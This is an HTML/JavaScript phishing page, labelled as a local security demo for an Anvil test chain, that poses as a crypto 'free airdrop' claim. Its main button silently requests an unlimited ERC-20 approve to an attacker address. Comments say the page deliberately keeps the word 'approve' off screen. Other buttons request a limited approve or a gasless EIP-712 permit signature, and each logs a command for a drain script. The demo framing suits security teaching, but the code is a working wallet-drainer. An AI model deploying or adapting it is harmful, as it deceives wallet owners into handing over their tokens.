<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="utf-8">
<title>🎁 Free AIRDROP 空投领取</title>
<style>
  body { font-family: system-ui, sans-serif; max-width: 560px; margin: 60px auto; padding: 0 16px;
         background: #0d1117; color: #e6edf3; text-align: center; }
  .warn { background: #7a5b00; color: #fff; padding: 6px; font-size: 0.85em; border-radius: 4px; margin-bottom: 30px; }
  h1 { font-size: 1.6em; } .amt { font-size: 2.2em; color: #3fb950; font-weight: bold; }
  button { font-size: 1.1em; padding: 14px 40px; border: 0; border-radius: 10px; cursor: pointer;
           background: #238636; color: #fff; margin: 8px; }
  button:hover { background: #2ea043; }
  button.ghost { background: #30363d; }
  #log { margin-top: 24px; text-align: left; white-space: pre-wrap; font-family: monospace;
         font-size: 0.8em; color: #8b949e; background: #161b22; padding: 12px; border-radius: 8px; min-height: 60px; }
  code { background: #21262d; padding: 2px 6px; border-radius: 4px; user-select: all; }
</style>
</head>
<body>
<div class="warn">⚠ 仅供本地安全演示(Issue #56)——零真实资产,仅指向本机 Anvil 测试链</div>
<h1>🎁 AIRDROP 空投活动</h1>
<p>恭喜!您符合条件,可领取</p>
<p class="amt">1,000 AIRDROP</p>
<p>连接钱包并领取,gas 由您支付(约 $0.01)</p>

<button onclick="claim()">🦊 连接钱包,领取空投</button>
<button class="ghost" onclick="claimExact()">(对比)领取"需签名两次"的版本</button>
<button class="ghost" onclick="permitSign()">(对比)gasless 领取(免 gas 签名)</button>
<div id="log">↑ 点击按钮开始。正常场景请用绿色按钮。</div>

<script>
// ===== 配置(与本机 Anvil 对应,见 docs/phishing-runbook.md)=====
const RPC_READ = "http://127.0.0.1:8546";      // 仅读取链状态用
const ATTACKER = "0x70997970C51812dc3A010C7d01b50e0d17dc79C8"; // Anvil 测试账户 #1,收割者
let TOKEN = localStorage.getItem("phishToken") || "0x<替换为部署后的代币地址>";
const AMOUNT_ETH18 = "1000000000000000000000";  // 1000 * 10^18(无限方案也用满额授权)

function log(m) { document.getElementById("log").textContent += "\n" + m; }
function token() {
  if (!TOKEN.startsWith("0x") || TOKEN.length !== 42) {
    const t = prompt("首次使用:粘贴部署的代币合约地址(cast deploy 输出)", "");
    if (t) { TOKEN = t.trim(); localStorage.setItem("phishToken", TOKEN); }
  }
  return TOKEN;
}
async function wallet() {
  if (!window.ethereum) { alert("未检测到 MetaMask。请按 docs/phishing-runbook.md 安装并导入 Anvil 测试私钥。"); throw new Error("no wallet"); }
  await window.ethereum.request({ method: "wallet_switchEthereumChain", params: [{ chainId: "0x7a69" }] })
    .catch(() => window.ethereum.request({ method: "wallet_addEthereumChain", params: [{
      chainId: "0x7a69", chainName: "Anvil Local", rpcUrls: [RPC_READ], nativeCurrency: { name: "ETH", symbol: "ETH", decimals: 18 } }] }));
  return (await window.ethereum.request({ method: "eth_accounts" }))[0];
}

// 攻击核心:让受害者把"领取空投"理解成收款,实际签的是"授权攻击者动用全部代币"。
// 页面上不显示 approve 字样——真实钓鱼正是靠这种语义错位得手。
async function claim() {
  try {
    const victim = await wallet();
    log("[*] 向钱包请求签名…(受害者以为在'领取',实际是无限授权)");
    const data = "0x095ea7b3"
      + ATTACKER.toLowerCase().slice(2).padStart(64, "0")
      + BigInt("0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff").toString(16);
    const hash = await window.ethereum.request({ method: "eth_sendTransaction",
      params: [{ from: victim, to: token(), data }] });
    log("[✓] 受害者已签名上链: " + hash);
    log("[i] 复制下面这条命令到终端执行收割:");
    log("    uv run python scripts/drain.py --tx " + hash + " --token " + token());
  } catch (e) { log("[!] 失败/被拒: " + e.message); }
}

// 对比场景:精确授权(有限额度),钓鱼者只能拿到授权内的数额。
async function claimExact() {
  try {
    const victim = await wallet();
    log("[*] 精确 approve(1000)…");
    const data = "0x095ea7b3"
      + ATTACKER.toLowerCase().slice(2).padStart(64, "0")
      + BigInt(AMOUNT_ETH18).toString(16).padStart(64, "0");
    const hash = await window.ethereum.request({ method: "eth_sendTransaction",
      params: [{ from: victim, to: token(), data }] });
    log("[✓] 已上链: " + hash);
    log("[i] 收割命令: uv run python scripts/drain.py --tx " + hash + " --token " + token());
  } catch (e) { log("[!] 失败/被拒: " + e.message); }
}

// permit 路径:签名不产生交易,收割脚本需拿签名自己上链。
async function permitSign() {
  try {
    const victim = await wallet();
    const chainId = await window.ethereum.request({ method: "eth_chainId" });
    const msg = { owner: victim, spender: ATTACKER, value: AMOUNT_ETH18,
                  deadline: "1893456000", nonce: "0" };
    const payload = {
      types: {
        EIP712Domain: [{ name: "name", type: "string" }, { name: "version", type: "string" },
                       { name: "chainId", type: "uint256" }, { name: "verifyingContract", type: "address" }],
        Permit: [{ name: "owner", type: "address" }, { name: "spender", type: "address" },
                 { name: "value", type: "uint256" }, { name: "deadline", type: "uint256" },
                 { name: "nonce", type: "uint256" }],
      },
      primaryType: "Permit",
      domain: { name: "PhishingToken", version: "1", chainId: parseInt(chainId), verifyingContract: token() },
      message: msg,
    };
    log("[*] 请求免 gas 签名…(permit 不产生交易,链上看不到任何痕迹)");
    const sig = await window.ethereum.request({ method: "eth_signTypedData_v4",
      params: [victim, JSON.stringify(payload)] });
    log("[✓] 已获得签名: " + sig.slice(0, 20) + "…");
    log("[i] 收割命令(一条,复制执行):");
    log(`    uv run python scripts/drain.py --permit --token ${token()} --sig ${sig} \\\n        --owner ${victim} --value ${AMOUNT_ETH18} --deadline 1893456000 --nonce 0`);
  } catch (e) { log("[!] 失败/被拒: " + e.message); }
}
</script>
</body>
</html>
